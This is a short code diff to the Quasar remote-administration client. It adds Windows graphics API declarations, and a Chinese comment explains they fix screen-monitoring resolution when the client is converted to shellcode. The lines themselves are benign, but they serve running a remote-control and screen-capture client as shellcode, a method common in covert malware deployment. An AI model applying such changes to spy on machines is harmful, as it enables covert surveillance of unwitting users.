@@ -18,6 +18,23 @@ namespace Quasar.Client.Utilities
             [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
         }
 
+        /*
+        * 修复转为shellcode时屏幕监控分辨率问题
+        * 增加GetDeviceCaps、GetDC、GetSystemMetrics、ReleaseDC的原生API
+        */
+
+        [DllImport("gdi32.dll")]
+        public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+        [DllImport("User32.dll", EntryPoint = "ReleaseDC")]
+        public extern static int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("User32.dll", EntryPoint = "GetDC")]
+        public extern static IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        public static extern int GetSystemMetrics(int nIndex);
+
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         internal static extern IntPtr LoadLibrary(string lpFileName);
 
